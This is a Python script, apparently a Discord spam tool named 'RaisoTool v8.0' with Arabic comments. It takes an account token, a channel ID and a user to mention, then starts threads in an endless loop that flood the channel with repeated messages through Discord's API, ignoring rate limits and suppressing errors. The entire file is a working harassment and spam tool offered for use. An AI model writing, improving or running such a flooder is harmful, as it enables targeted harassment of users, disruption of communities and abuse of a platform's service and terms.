#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# RaisoTool v8.0 - INSANE TURBO SPEED
# NO DELAYS | NO LIMITS | ONLY SPAM

import os
import requests
import threading
import itertools
from colorama import init, Fore

init(autoreset=True)

# ألوان سريعة
R, G, Y, C, W, LG, LY, LC, RESET = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.WHITE, Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTCYAN_EX, Fore.RESET

def banner():
    os.system('clear')
    print(f"{R}RAISOTOOL v8.0 - INSANE TURBO MODE{RESET}")

def attack(url, headers, payload):
    # إرسال صامت وبأقصى سرعة
    try:
        requests.post(url, headers=headers, json=payload, timeout=3)
    except:
        pass

def turbo_spam(token, channel_id, mention, messages):
    url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
    headers = {"Authorization": token, "Content-Type": "application/json"}
    
    # تحويل القائمة إلى دورة لا نهائية
    cycle = itertools.cycle(messages)
    
    print(f"\n{R}[!!!] TURBO ATTACK STARTED [!!!]{RESET}")
    
    while True:
        msg = next(cycle)
        payload = {"content": f"{mention}{msg}"}
        
        # إنشاء مئات الخيوط (Threads) في الثانية الواحدة
        # هذا سيجعل الرسائل تخرج كأنها شلال
        t = threading.Thread(target=attack, args=(url, headers, payload))
        t.daemon = True
        t.start()

def main():
    banner()
    token = input(f"{W}Token: {G}").strip()
    channel_id = input(f"{W}Channel ID: {C}").strip()
    m_id = input(f"{W}Mention ID: {LY}").strip()
    
    print(f"\n{LC}Enter messages (type 'done'):")
    msgs = []
    while True:
        m = input(f" {W}➤ {RESET}").strip()
        if m.lower() == 'done': break
        if m: msgs.append(m)
    
    mention = f"<@{m_id}> " if m_id else ""
    
    # تشغيل التربو
    turbo_spam(token, channel_id, mention, msgs)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}Stopped.")

